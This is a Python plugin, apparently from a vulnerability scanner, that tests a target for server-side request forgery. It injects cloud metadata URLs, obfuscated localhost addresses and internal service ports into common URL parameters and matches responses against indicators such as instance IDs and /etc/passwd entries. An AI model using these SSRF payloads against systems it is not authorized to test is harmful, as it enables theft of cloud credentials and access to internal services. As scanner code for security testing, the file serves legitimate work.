# plugins/ssrf_scanner.py
def run(target, ip, open_ports, banners):
    """
    Scanner SSRF (Server-Side Request Forgery).
    Testa acesso a endpoints internos e cloud metadata via parâmetros URL.
    Foco 2026: AWS/GCP/Azure metadata endpoints + protocolos internos.
    """
    import requests
    import time

    params = ["url", "link", "src", "href", "path", "file", "page", "site",
              "feed", "proxy", "callback", "redirect", "img", "image"]

    # Cloud metadata endpoints
    internal_targets = [
        ("http://169.254.169.254/latest/meta-data/", "AWS_METADATA"),
        ("http://169.254.169.254/computeMetadata/v1/", "GCP_METADATA"),
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "AZURE_METADATA"),
        ("http://127.0.0.1:80/", "LOCALHOST"),
        ("http://[::1]/", "LOCALHOST_IPV6"),
        ("http://0177.0.0.1/", "LOCALHOST_OCTAL"),
        ("http://2130706433/", "LOCALHOST_DECIMAL"),
        ("http://127.0.0.1:22/", "SSH_INTERNAL"),
        ("http://127.0.0.1:3306/", "MYSQL_INTERNAL"),
        ("http://127.0.0.1:6379/", "REDIS_INTERNAL"),
    ]

    vulns = []

    for param in params:
        for internal_url, label in internal_targets:
            url = f"http://{target}/?{param}={internal_url}"
            try:
                start = time.time()
                resp = requests.get(url, timeout=8, allow_redirects=True)
                elapsed = time.time() - start

                # Indicadores de SSRF
                ssrf_indicators = [
                    "ami-id", "instance-id", "local-ipv4",  # AWS
                    "computeMetadata", "google",  # GCP
                    "azure", "vmId",  # Azure
                    "SSH-", "MySQL", "redis_version",  # Serviços internos
                    "root:", "daemon:", "nobody:",  # /etc/passwd
                ]

                for indicator in ssrf_indicators:
                    if indicator in resp.text:
                        vulns.append({
                            "tipo": "SSRF",
                            "parametro": param,
                            "payload": internal_url,
                            "alvo_interno": label,
                            "indicador": indicator,
                            "severidade": "CRITICO" if "METADATA" in label else "ALTO",
                            "tamanho_resposta": len(resp.text),
                            "amostra": resp.text[:200],
                        })
                        break

                # Time-based SSRF detection
                if elapsed > 5 and label in ["SSH_INTERNAL", "MYSQL_INTERNAL", "REDIS_INTERNAL"]:
                    vulns.append({
                        "tipo": "SSRF_TIME_BASED",
                        "parametro": param,
                        "payload": internal_url,
                        "alvo_interno": label,
                        "tempo_resposta": round(elapsed, 2),
                        "severidade": "MEDIO",
                        "descricao": "Delay anormal pode indicar conexão a serviço interno"
                    })

            except requests.ConnectionError:
                continue
            except requests.Timeout:
                # Timeout pode indicar tentativa de conexão a serviço interno
                vulns.append({
                    "tipo": "SSRF_TIMEOUT",
                    "parametro": param,
                    "payload": internal_url,
                    "alvo_interno": label,
                    "severidade": "BAIXO",
                    "descricao": "Timeout ao acessar recurso interno (possível indicador)"
                })
            except Exception:
                continue

    return {
        "plugin": "ssrf_scanner",
        "resultados": vulns if vulns else "Nenhuma vulnerabilidade SSRF detectada"
    }
